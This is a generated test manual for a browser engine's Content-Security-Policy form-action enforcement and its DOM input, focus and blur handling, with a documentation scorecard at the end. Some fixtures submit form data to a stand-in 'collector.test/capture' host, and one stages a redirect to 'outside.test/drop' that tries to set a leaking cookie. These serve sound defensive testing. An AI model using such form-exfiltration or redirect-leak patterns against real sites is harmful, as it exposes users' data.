# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: does not apply default-src when form-action is absent")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).is_ok()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: default-src 'none'; " +
    "sandbox allow-forms allow-top-navigation",
    "<html><body><form id='profile' " +
    "action='https://collector.test/capture' method='post'>" +
    "<input name='name' value='Ada'><button id='send' " +
    "type='submit'>Send</button></form></body></html>", ""
)).is_ok()).to_be(true)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "send"), "click", true, true
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
val request = session.take_pending_request().unwrap()
expect(request.url).to_equal("https://collector.test/capture")
expect(request.method).to_equal("POST")
expect(request.body).to_equal("name=Ada")
```

</details>

#### matches form-action host sources without weakening fetch directives

- Verify: matches form-action host sources without weakening fetch directives


<details>
<summary>Executable SSpec</summary>

Runnable source: 76 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: matches form-action host sources without weakening fetch directives")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
val document_url = "https://account.test/profile"
expect(browser_csp_form_action_allows(
    "form-action submit.account.test/forms/", document_url,
    "https://submit.account.test/forms/save"
)).to_be(true)
expect(browser_csp_form_action_allows(
    "form-action submit.account.test/forms/", document_url,
    "https://submit.account.test/other"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action *.account.test:*", document_url,
    "https://deep.forms.account.test:9443/save"
)).to_be(true)
expect(browser_csp_form_action_allows(
    "form-action *.account.test:*", document_url,
    "https://account.test:9443/save"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action submit.account.test:8443", document_url,
    "https://submit.account.test:8443/save"
)).to_be(true)
expect(browser_csp_form_action_allows(
    "form-action submit.account.test:8443", document_url,
    "https://submit.account.test:9443/save"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action https://submit.account.test:443", document_url,
    "https://submit.account.test/save"
)).to_be(true)
expect(browser_csp_form_action_allows(
    "form-action https://submit.account.test", document_url,
    "https://submit.account.test:443/save"
)).to_be(true)
expect(browser_csp_form_action_allows(
    "form-action submit.account.test", document_url,
    "https://submit.account.test:8443/save"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action https://submit.account.test:", document_url,
    "https://submit.account.test:8443/save"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action https://submit.account.test:abc", document_url,
    "https://submit.account.test/save"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action https://[submit.account.test", document_url,
    "https://submit.account.test/save"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action http:", document_url,
    "https://submit.account.test/save"
)).to_be(true)
expect(browser_csp_form_action_allows(
    "form-action https:", document_url,
    "https://submit.account.test:8443/save"
)).to_be(true)
expect(browser_csp_form_action_allows(
    "form-action https:", document_url,
    "http://submit.account.test/save"
)).to_be(false)
expect(browser_csp_form_action_allows(
    "form-action submit.account.test", document_url,
    "http://submit.account.test/save"
)).to_be(false)
expect(browser_csp_allows(
    "default-src https://cdn.test/assets/", "img-src", document_url,
    "https://cdn.test/assets/logo.png", false
)).to_be(true)
expect(browser_csp_allows(
    "default-src https://cdn.test/assets/", "img-src", document_url,
    "https://cdn.test/private/logo.png", false
)).to_be(false)
```

</details>

#### carries form-action across document redirects and denies before queue

- Verify: carries form-action across document redirects and denies before queue
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: allowed_redirect.csp_policy equals `initial.csp_policy`
   - Expected: cookie_before_denial equals ``
   - Expected: request_cookie_before_denial equals ``
   - Expected: hsts_before_denial equals `0)  # oracle: pinned constant asserted by this scenario`
   - Expected: session.document_cookie() equals `cookie_before_denial`
   - Expected: session.current_url equals `url_before_denial`
   - Expected: session.current_body_html equals `html_before_denial`


<details>
<summary>Executable SSpec</summary>

Runnable source: 69 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: carries form-action across document redirects and denies before queue")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).is_ok()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: sandbox allow-forms " +
    "allow-top-navigation allow-same-origin; " +
    "form-action *.account.test:*",
    "<html><body><form id='profile' " +
    "action='https://forms.account.test:8443/submit' method='post'>" +
    "<input name='name' value='Ada'><button id='send' " +
    "type='submit'>Send</button></form></body></html>", ""
)).is_ok()).to_be(true)
val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "send"), "click", true, true
).unwrap()
expect(dispatch.default_action).to_equal("button-activate")
val initial = session.take_pending_request().unwrap()
expect(initial.csp_policy).to_contain("form-action *.account.test:*")
expect(initial.csp_document_url).to_equal(
    "https://account.test/profile"
)
expect(session.commit_network_response(BrowserResponse.create(
    initial.id, "document", initial.url, 302,
    "Location: https://next.account.test:9443/continue", "", ""
)).is_ok()).to_be(true)
val allowed_redirect = session.take_pending_request().unwrap()
expect(allowed_redirect.url).to_equal(
    "https://next.account.test:9443/continue"
)
expect(allowed_redirect.csp_policy).to_equal(initial.csp_policy)
expect(allowed_redirect.csp_document_url).to_equal(
    initial.csp_document_url
)
val cookie_before_denial = session.document_cookie()
val request_cookie_before_denial = session.cookie_header_for_request(
    "https://account.test/after"
)
val hsts_before_denial = session.hsts_snapshot(1000).entries.len()
expect(cookie_before_denial).to_equal("")
expect(request_cookie_before_denial).to_equal("")
expect(hsts_before_denial).to_equal(0)  # oracle: pinned constant asserted by this scenario
val url_before_denial = session.current_url
val html_before_denial = session.current_body_html
val denied_redirect = session.commit_network_response(
    BrowserResponse.create(
        allowed_redirect.id, "document", allowed_redirect.url, 307,
        "Location: https://outside.test/drop\n" +
        "Set-Cookie: redirect_leak=1; Domain=account.test; " +
        "Path=/; Secure\n" +
        "Strict-Transport-Security: max-age=60", "", ""
    )
)
expect(denied_redirect.is_err()).to_be(true)
expect(session.take_pending_request()).to_be_nil()
expect(session.document_cookie()).to_equal(cookie_before_denial)
expect(session.cookie_header_for_request(
    "https://account.test/after"
)).to_equal(request_cookie_before_denial)
expect(session.hsts_snapshot(1000).entries.len()).to_equal(
    hsts_before_denial
)
expect(session.current_url).to_equal(url_before_denial)
expect(session.current_body_html).to_equal(html_before_denial)
```

</details>

#### applies form-action to implicit and keyboard submit callers

- Verify: applies form-action to implicit and keyboard submit callers


<details>
<summary>Executable SSpec</summary>

Runnable source: 27 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: applies form-action to implicit and keyboard submit callers")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).is_ok()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: sandbox allow-forms " +
    "allow-top-navigation; form-action 'none'",
    "<html><body><form id='profile' action='/save' method='post'>" +
    "<input id='name' name='name' value='Ada'><button id='send' " +
    "type='submit'>Send</button></form></body></html>", ""
)).is_ok()).to_be(true)
val _ = session.dispatch_dom_keyboard_code_event(
    Some(_dom_input_route(session, "name")), 13, true, false
).unwrap()
expect(session.take_pending_request()).to_be_nil()
val _ = session.dispatch_dom_keyboard_code_event(
    Some(_dom_input_route(session, "send")), 13, true, false
).unwrap()
expect(session.take_pending_request()).to_be_nil()
expect(session.warnings.join("|")).to_contain(
    "CSP blocked form submission: https://account.test/save"
)
```

</details>

#### updates text input value and emits its inline input handler

- Verify: updates text input value and emits its inline input handler
   - Expected: session.current_title equals `Typing`


<details>
<summary>Executable SSpec</summary>

Runnable source: 14 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: updates text input value and emits its inline input handler")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/input",
    "<html><body><input id='name' oninput=\"document.title='Typing'\"></body></html>"
)

val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "name"), "Ada & Bob"
).unwrap()
expect(session.current_title).to_equal("Typing")
expect(session.current_body_html).to_contain("value=\"Ada &amp; Bob\"")
```

</details>

#### dispatches focus before text input and keeps one focused control

- Verify: dispatches focus before text input and keeps one focused control
   - Expected: session.current_title equals `Focused`
   - Expected: session.dom_callback_count equals `callbacks_after_focus`
   - Expected: be_dom_get_attr(inputs[0], "data-focused") equals ``
   - Expected: be_dom_get_attr(inputs[1], "data-focused") equals `true`


<details>
<summary>Executable SSpec</summary>

Runnable source: 24 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: dispatches focus before text input and keeps one focused control")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/input",
    "<html><body><input id='first' onfocus=\"document.title='Focused'\"><input id='second'></body></html>"
)

val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "first"), "Ada"
).unwrap()
expect(session.current_title).to_equal("Focused")
val callbacks_after_focus = session.dom_callback_count
val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "first"), "Ada Lovelace"
).unwrap()
expect(session.dom_callback_count).to_equal(callbacks_after_focus)
val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "second"), "Bob"
).unwrap()
val inputs = be_dom_find_by_tag(session.dom_root(), "input")
expect(be_dom_get_attr(inputs[0], "data-focused")).to_equal("")
expect(be_dom_get_attr(inputs[1], "data-focused")).to_equal("true")
```

</details>

#### blurs the old control before focus mutates and paints the new state

- Verify: blurs the old control before focus mutates and paints the new state
- Open two controls whose focus transition mutates rendered CSS
- Focus the first control, then move focus to the second
   - Expected: session.eval_script("document.title=''").is_ok() is true
- Require blur-before-focus state through DOM, Draw IR, and pixels
   - Expected: session.current_title equals `blur>focus>`
   - Expected: be_dom_get_attr(inputs[0], "data-focused") equals ``
   - Expected: be_dom_get_attr(inputs[1], "data-focused") equals `true`
   - Expected: stage_color equals `0xFF2563EBu32`


<details>
<summary>Executable SSpec</summary>

Runnable source: 42 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: blurs the old control before focus mutates and paints the new state")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
step("Open two controls whose focus transition mutates rendered CSS")
var session = BrowserSession.new()
expect(session.open_html(
    "https://example.test/focus-order",
    "<html><head><style>#stage{width:32px;height:24px;background-color:#ef4444}.blurred{{background-color:#f59e0b}}.focused{{background-color:#2563eb}}</style></head><body><div id='stage'></div><input id='first' onblur=\"document.title=document.title+'blur>';document.getElementById('stage').className='blurred'\"><input id='second' onfocus=\"document.title=document.title+'focus>';document.getElementById('stage').className='focused'\"></body></html>"
).is_ok()).to_equal(true)

step("Focus the first control, then move focus to the second")
val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "first"), "Ada"
).unwrap()
expect(session.eval_script("document.title=''").is_ok()).to_equal(true)
val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "second"), "Bob"
).unwrap()

step("Require blur-before-focus state through DOM, Draw IR, and pixels")
expect(session.current_title).to_equal("blur>focus>")
val inputs = be_dom_find_by_tag(session.dom_root(), "input")
expect(be_dom_get_attr(inputs[0], "data-focused")).to_equal("")
expect(be_dom_get_attr(inputs[1], "data-focused")).to_equal("true")
val rendered = session.render_html_document()
expect(rendered).to_contain("id=\"stage\" class=\"focused\"")
val composition = WebRenderBackend.create(
    "pure_simple", 64, 64
).render_html_to_draw_ir(rendered)
var stage_color = 0u32
for batch in composition.batches:
    for command in batch.commands:
        if command.component_id == "stage":
            stage_color = command.color
expect(stage_color).to_equal(0xFF2563EBu32)
val pixels = session.render_to_pixels(64, 64).pixel_data
expect(_count_dom_input_color(
    pixels, 0xFF2563EBu32
)).to_be_greater_than(0)
expect(_count_dom_input_color(
    pixels, 0xFFF59E0Bu32
)).to_equal(0)  # oracle: pinned constant asserted by this scenario
```

</details>

## Scenario Summary

| Metric | Count |
|--------|------:|
| Total scenarios | 25 |
| Active scenarios | 25 |
| Slow scenarios | 0 |
| Skipped scenarios | 0 |
| Pending scenarios | 0 |


</details>

<!-- sspec-maintain:provenance:start -->
## Generation history

- Canonical SPipe generation for source `bcfaf41b59161f781d766f9e302584afe76c5e0a51f11c3bbf1b74dbd5d82500`; maintenance tool `1`, rules `ssdoc-rules/1`.

Source SHA-256: `bcfaf41b59161f781d766f9e302584afe76c5e0a51f11c3bbf1b74dbd5d82500`.
<!-- sspec-maintain:provenance:end -->

<!-- sspec-maintain:scorecard:start -->
## SSpec documentization scorecard

Source SHA-256: `bcfaf41b59161f781d766f9e302584afe76c5e0a51f11c3bbf1b74dbd5d82500`  
Analyzer: `1`; rules: `ssdoc-rules/1`  
Raw score: **94/100**; effective score: **94/100**; blockers: **0**.

SSpec documentization score: 94/100
source: test/02_integration/rendering/browser_session_dom_input_spec.spl
mirror: doc/06_spec/02_integration/rendering/browser_session_dom_input_spec.md (current)
findings: 4 blockers: 0
  narrative=100 structure=95 oracle=100
  traceability=100 evidence=85 coverage=100 maintainability=70
  cache=not-used suppressed=0
  lint-owned related rules=SPIPE001,SPIPE002,SPIPE003,SPIPE004,SPIPE005,SPIPE006,SPIPE007
doc/06_spec/02_integration/rendering/browser_session_dom_input_spec.md:1:1: warning SSDOC-EVD-002 [evidence] (-15): source steps are not visible in the generated manual
  why: Source tokens alone do not prove reader-visible workflow structure.
  improve: Use supported literal step calls and regenerate the manual.
doc/06_spec/02_integration/rendering/browser_session_dom_input_spec.md:1:1: advice SSDOC-MNT-005 [maintainability] (-10): generated manual lacks verification or troubleshooting guidance
  why: Operators need recovery and evidence interpretation guidance.
  improve: Author verification and recovery facts in SSpec and regenerate.
doc/06_spec/02_integration/rendering/browser_session_dom_input_spec.md:1:1: warning SSDOC-MNT-008 [maintainability] (-20): manual is missing: assumptions/preconditions, traceability, recovery/troubleshooting
  why: A test dump is not a complete professional specification manual.
  improve: Author the missing facts in SSpec and regenerate through canonical SPipe docgen.
test/02_integration/rendering/browser_session_dom_input_spec.spl:98:1: advice SSDOC-BEH-002 [structure] (-5): scenario name 'should parse mixed-case document tags through layout Draw IR and pixels' describes the test rather than its outcome
  why: Outcome names describe product behavior rather than test mechanics.
  improve: Rename it to the observable product outcome.
<!-- sspec-maintain:scorecard:end -->
